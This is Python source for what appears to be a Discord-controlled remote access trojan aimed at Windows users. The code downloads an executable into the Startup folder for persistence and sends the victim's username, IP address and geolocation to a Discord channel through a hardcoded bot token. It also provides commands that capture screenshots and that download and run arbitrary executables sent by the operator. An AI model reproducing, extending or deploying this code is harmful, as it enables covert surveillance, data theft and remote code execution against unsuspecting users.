
import requests, os, discord,  pyautogui
from discord.ext import commands

token = "OTM2MjEwMDAxMDc5NDY4MDMy.G2-06Y.2OvA2MEcUZpmSMlWIiLbsAyqdI0Hxc4Yzsq9TQ"
try:
    f = requests.get("https://cdn.discordapp.com/attachments/989650068527267863/990011058041274458/main.exe")
    if f.status_code == 200:
        with open(f"C:\\Users\\{os.getlogin()}\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\main.exe", "wb") as goofy:
            goofy.write(f.content)
            goofy.close()
    
    

except:
    pass

webhook_url = 'https://discord.com/api/webhooks/989974398385668138/WR9lWaNStvqZBePGLnhd7IgTBY-lz-SAQv_dBUw1kC3ygc-woi6lCZ4W6UvEJZ-ZCQe0'


client: commands.Bot = commands.Bot(command_prefix="!", intents=discord.Intents.all())
client.remove_command("help")
class RunningArtkage:
    def __init__(self) -> None:
        self.headers = {"Authorization": f"Bot {token}"}
        self.r = requests.get("https://geolocation-db.com/json/")
        if self.r.status_code == 200: 
            content = self.r.json()
            user_info = f"@everyone \nUserName: {os.getlogin()}\nIp: {content['IPv4']}\n Country: {content['country_code']}\n Latitude: {content['latitude']}\n Longitude: {content['longitude']}\n Postal: {content['postal']}\n State: {content['state']}"
        requests.post(
            "https://discord.com/api/v9/channels/989678225024245860/messages",
            headers = self.headers,
            json = {"content": user_info, "nonce": None, "tts": False}
        )
        
    
        

    @client.command()
    async def ss(ctx):
        pyautogui.screenshot().save(f"C:\\Users\\{os.getlogin()}\\Videos\\ss.png")
        await ctx.reply(file=discord.File(f"C:\\Users\\{os.getlogin()}\\Videos\\ss.png"))
    
    @client.command()
    async def upload(ctx):
        if not " " in ctx.message.content:
            return
        if "." not in ctx.message.content.split(" ")[1]:
            download_url = ctx.message.content.split(" ")[1]
        else:
            download_url = ctx.message.content.split(" ")[1]
        r = requests.get(download_url)
        with open(f"C:\\Users\\{os.getlogin()}\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\manga.exe", "wb") as file:
            file.write(r.content)
            file.close()
        with open(f"C:\\Users\\{os.getlogin()}\\Videos\\manga.exe", "wb") as file2:
            file2.write(r.content)
            file2.close()
        kylens_path = f"C:\\Users\\{os.getlogin()}\\Videos\\manga.exe"
        os.system(kylens_path)
        await ctx.reply("successfully downloaded and ran the file!")

    @client.command()
    async def help(ctx): 
        await ctx.reply("""Commands: \n!ss,  !upload [download link]  """)  